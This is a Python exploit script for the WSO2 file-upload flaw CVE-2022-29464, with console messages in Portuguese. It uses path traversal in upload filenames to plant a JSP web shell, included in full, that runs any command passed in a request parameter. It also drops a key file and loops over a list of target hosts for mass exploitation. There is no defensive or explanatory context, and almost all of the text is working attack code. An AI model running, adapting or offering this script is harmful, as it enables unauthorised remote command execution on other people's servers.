import os      
import urllib3 
import requests
import argparse
from ast import arg
from rich.console import Console
delete_warning = urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

shell= '''<%@ page import="java.util.*,java.io.*"%>

<html>
<body>
    <FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
    <%
        if (request.getParameter("cmd") != null ) {
            out.println("Command: " + request.getParameter("cmd") + "<BR>");
            Runtime rt = Runtime.getRuntime();
            Process p = rt.exec(request.getParameter("cmd"));
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
            }
        }
    %>
    </pre>
</body>
</html>'''

public_key = '''KEY'''

def exploit(url):
    try:
        resp = requests.post(f"{url}/fileupload/toolsAny", timeout=2, verify=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/capoeira": public_key})
        resp = requests.post(f"{url}/fileupload/toolsAny", timeout=2, verify=False, files={"../../../../repository/deployment/server/webapps/authenticationendpoint/capoeira.jsp": shell})
        if resp.status_code == 200 and len(resp.content) > 0 and 'java' not in resp.text:
            console.log(f"[green][<>] Explorado com sucesso, shell : [bold]{url}/authenticationendpoint/capoeira.jsp[/bold][/green]")

        else:
            console.log(f"\r[red][!] Falhou [/red] {url}")
    except (requests.exceptions.Timeout,requests.exceptions.ConnectionError,requests.exceptions.InvalidURL):
        console.log(f"[red][!] Falhou [/red]")



def main():
    parser = argparse.ArgumentParser(description="WSO2 CVE-2022-29464")
    parser.add_argument("-u", help="URL")
    parser.add_argument("-f", help="Arquivo")
    args = parser.parse_args()
    if args.f:
        links = []
        with open(f"{os.getcwd()}/{args.f}","r") as f:
            tmp = f.readlines()
            for link in tmp:
                link = link.replace('\n','')
                if not '://' in link:
                    link = f"https://{link}"
                links.append(link)
        with console.status("[bold green]Explorando...") as status:
            for link in links:
                exploit(link)
    else:
        url = args.u
        exploit(url)



if "__main__" == __name__:
    main()
